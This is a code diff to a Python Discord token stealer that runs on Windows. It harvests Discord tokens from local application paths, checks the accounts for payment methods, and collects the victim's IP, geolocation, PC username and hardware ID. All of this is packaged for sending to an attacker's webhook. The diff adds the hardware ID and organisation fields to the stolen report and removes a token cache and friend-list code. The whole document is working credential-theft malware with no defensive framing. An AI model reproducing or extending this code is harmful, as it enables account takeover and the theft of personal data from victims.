@@ -1,4 +1,4 @@
-import re, os
+import os
 if os.name != "nt":
 	exit()
 from re import findall
@@ -9,9 +9,6 @@ from base64 import b64decode
 from subprocess import Popen, PIPE
 from urllib.request import Request, urlopen
 from datetime import datetime
-from threading import Thread
-from time import sleep
-from sys import argv
 
 webhook_url = "YOUR WEBHOOK HERE"
 
@@ -81,6 +78,11 @@ def gettokens(path):
 				for token in findall(regex, line):
 					tokens.append(token)
 	return tokens
+
+def gethwid():
+    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+
 def getip():
 	ip = org = loc = city = country = region = googlemap = "None"
 	try:
@@ -97,6 +99,7 @@ def getip():
 	except:
 		pass
 	return ip,org,loc,city,country,region,googlemap
+
 def getavatar(uid, aid):
 	url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
 	try:
@@ -104,19 +107,7 @@ def getavatar(uid, aid):
 	except:
 		url = url[:-4]
 	return url
-def gethwid():
-	p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-	return (p.stdout.read() + p.stderr.read()).decode().split("\\n")[1]
-def getfriends(token):
-	try:
-		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
-	except:
-		pass
-def getchat(token, uid):
-	try:
-		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
-	except:
-		pass
+
 def has_payment_methods(token):
 	try:
 		return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
@@ -124,8 +115,6 @@ def has_payment_methods(token):
 		pass
 
 def main():
-	cache_path = ROAMING + "\\.cache~$"
-	prevent_spam = True
 	embeds = []
 	working = []
 	checked = []
@@ -135,7 +124,6 @@ def main():
 	ip,org,loc,city,country,region,googlemap = getip()
 	pc_username = os.getenv("UserName")
 	pc_name = os.getenv("COMPUTERNAME")
-	user_path_name = os.getenv("userprofile").split("\\")[2]
 	for platform, path in PATHS.items():
 		if not os.path.exists(path):
 			continue
@@ -182,7 +170,7 @@ def main():
 					},
 					{
 						"name": "**Pc Info**",
-						"value": f'OS: {computer_os}\nUsername: {pc_username}\nPc Name: {pc_name}\nToken Location: {platform}',
+						"value": f'OS: {computer_os}\nUsername: {pc_username}\nPc Name: {pc_name}\nHwid:\n{gethwid()}',
 						"inline": True
 					},
 					{
@@ -192,12 +180,12 @@ def main():
 					},
 					{
 						"name": "**IP**",
-						"value": f'IP: {ip}\nMap location: [{loc}]({googlemap})\nCity: {city}\nRegion: {region}',
+						"value": f'IP: {ip}\nMap location: [{loc}]({googlemap})\nCity: {city}\nRegion: {region}\nOrg: {org}',
 						"inline": True
 					},
 					{
 						"name": "**Other Info**",
-						"value": f'Locale: {locale} ({language})\nEmail Verified: {verified}\n2fa Enabled: {mfa_enabled}\nCreation Date: {creation_date}',
+						"value": f'Locale: {locale} ({language})\nToken Location: {platform}\nEmail Verified: {verified}\n2fa Enabled: {mfa_enabled}\nCreation Date: {creation_date}',
 						"inline": True
 					},
 					{
@@ -215,10 +203,6 @@ def main():
 				}
 			}
 			embeds.append(embed)
-	with open(cache_path, "a") as file:
-		for token in checked:
-			if not token in already_cached_tokens:
-				file.write(token + "\n")
 
 	if len(working) == 0:
 		working.append('123')
